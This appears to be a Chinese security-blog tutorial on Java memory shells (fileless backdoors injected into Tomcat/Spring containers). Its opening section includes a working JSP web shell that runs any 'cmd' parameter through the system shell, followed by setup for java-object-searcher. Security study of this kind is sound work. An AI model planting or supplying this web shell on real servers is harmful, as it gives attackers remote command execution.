<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2025/10/02/java 内存马/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            Java 内存马 | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    书签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                书签
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">17</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">56</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Java 内存马</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-10-02 14:39:21</span>
        <span class="mobile">2025-10-02 14:39:21</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-10-06 22:47:36</span>
            <span class="mobile">2025-10-06 22:47:36</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/web/">web</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/web/java-web/">java web</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/java-web/">java web</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>30.7k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>144 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>内存马（memory shell）</strong>指的是攻击者在获得<strong>代码执行</strong>后，<strong>不落盘</strong>地把恶意逻辑“挂接”进正在运行的 Java Web 容器（如 Tomcat&#x2F;Jetty&#x2F;Undertow 或上层框架如 Spring MVC）——让后续的 HTTP 请求在内存中的组件里被拦截&#x2F;处理，从而实现长期控制与隐蔽通信。进程<strong>彻底重启</strong>通常会使其消失。</p>
<p>通常来说，由于 Java 的 JSP 支持热加载，因此我们可以通过上传一个 JSP 的 Web Shell 来实现不出网情况下的任意命令执行。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    request.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>); <span class="comment">// POST 参数防乱码（GET 需配 connector URIEncoding）</span></span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty()) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isWin</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 按各自平台常见编码解码子进程输出</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">procCharset</span> <span class="operator">=</span> isWin ? <span class="string">&quot;GBK&quot;</span> : <span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line"></span><br><span class="line">        String[] full = isWin ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;</span><br><span class="line">                : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">pb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(full);</span><br><span class="line">        pb.redirectErrorStream(<span class="literal">true</span>);                 <span class="comment">// 合并 stderr，避免阻塞</span></span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> pb.start();</span><br><span class="line"></span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> (java.io.<span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(p.getInputStream(),</span><br><span class="line">                        java.nio.charset.Charset.forName(procCharset)))) &#123;</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            p.waitFor();                                  <span class="comment">// 等子进程结束（可选）</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>

<p>而内存马则不会有实体文件，而是直接运行在 Web 进程中。目前安全行业主要讨论的内存马主要分为以下几种方式：</p>
<ul>
<li>动态注册 servlet&#x2F;filter&#x2F;listener（使用 servlet-api 的具体实现）</li>
<li>动态注册 interceptor&#x2F;controller（使用框架如 spring&#x2F;struts2）</li>
<li>动态注册使用<strong>职责链</strong>设计模式的中间件、框架的实现（例如 Tomcat 的 Pipeline &amp; Valve，Grizzly 的 FilterChain &amp; Filter 等等）</li>
<li>使用 java agent 技术写入字节码</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>通常我们说的内存马文件不落地指的是</p>

    </div>
  </div>

<h2 id="对象搜索"><a href="#对象搜索" class="headerlink" title="对象搜索"></a>对象搜索</h2><p>内存马通常需要往指定对象中注册监听类，这就需要我们通过当前可直接访问的对象查找目标对象。</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/c0ny1/java-object-searcher" >Java Object Searcher<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 项目可以对内存中的对象进行搜索。</p>
<p>我们首先需要将 <code>java-object-searcher-&lt;version&gt;.jar</code> 引入到目标应用的 <code>classpath</code> 中，或者可以放在 jdk 的 ext 目录；之后编写调用代码搜索目标对象。</p>
<p>对于 Maven 项目中我们需要在 <code>pom.xml</code> 中添加 <code>java-object-searcher</code> 的依赖：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>me.gv7.tools<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>java-object-searcher<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>local<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">scope</span>&gt;</span>system<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">systemPath</span>&gt;</span>$&#123;project.basedir&#125;/lib/java-object-searcher.jar<span class="tag">&lt;/<span class="name">systemPath</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>并且确保在打包成 war 包的时候也要将 Jar 包放到 <code>WEB-INF/lib</code> 目录下：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-war-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">webResources</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span>&gt;</span>$&#123;project.basedir&#125;/lib<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">targetPath</span>&gt;</span>WEB-INF/lib<span class="tag">&lt;/<span class="name">targetPath</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">include</span>&gt;</span>java-object-searcher.jar<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">webResources</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>搜索目标对象的时候需要根据要搜索什么样的对象，选择对应的搜索器，目前项目有三类：</p>
<ul>
<li><code>JavaObjectSearcher</code>：普通搜索器</li>
<li><code>SearchRequstByBFS</code>：通过广度优先搜索 <code>requst</code> 对象搜索器</li>
<li><code>SearchRequstByRecursive</code>：通过深度优先搜索 <code>requst</code> 对象搜索器（递归实现）</li>
</ul>
<p>以搜索 <code>request</code> 对象为例，选好搜索器 <code>SearchRequstByBFS</code>，并根据要搜索的目标特点构造好关键字(必须)和黑名单(非必须)，可写如下搜索代码到 IDEA 的 <code>Evaluate</code> 中执行。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置搜索类型包含Request关键字的对象</span></span><br><span class="line">java.util.List&lt;me.gv7.tools.josearcher.entity.Keyword&gt; keys = <span class="keyword">new</span> <span class="title class_">java</span>.util.ArrayList&lt;&gt;();</span><br><span class="line">keys.add(<span class="keyword">new</span> <span class="title class_">me</span>.gv7.tools.josearcher.entity.Keyword.Builder().setField_type(<span class="string">&quot;ServletRequest&quot;</span>).build());</span><br><span class="line"><span class="comment">//定义黑名单</span></span><br><span class="line">java.util.List&lt;me.gv7.tools.josearcher.entity.Blacklist&gt; blacklists = <span class="keyword">new</span> <span class="title class_">java</span>.util.ArrayList&lt;&gt;();</span><br><span class="line">blacklists.add(<span class="keyword">new</span> <span class="title class_">me</span>.gv7.tools.josearcher.entity.Blacklist.Builder().setField_type(<span class="string">&quot;java.io.File&quot;</span>).build());</span><br><span class="line"><span class="comment">//新建一个广度优先搜索Thread.currentThread()的搜索器</span></span><br><span class="line">me.gv7.tools.josearcher.searcher.<span class="type">SearchRequstByBFS</span> <span class="variable">searcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">me</span>.gv7.tools.josearcher.searcher.SearchRequstByBFS(Thread.currentThread(),keys);</span><br><span class="line"><span class="comment">// 设置黑名单</span></span><br><span class="line">searcher.setBlacklists(blacklists);</span><br><span class="line"><span class="comment">//打开调试模式,会生成log日志</span></span><br><span class="line">searcher.setIs_debug(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//挖掘深度为20</span></span><br><span class="line">searcher.setMax_search_depth(<span class="number">20</span>);</span><br><span class="line"><span class="comment">//设置报告保存位置</span></span><br><span class="line">searcher.setReport_save_path(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">searcher.searchObject();</span><br></pre></td></tr></table></figure></div>

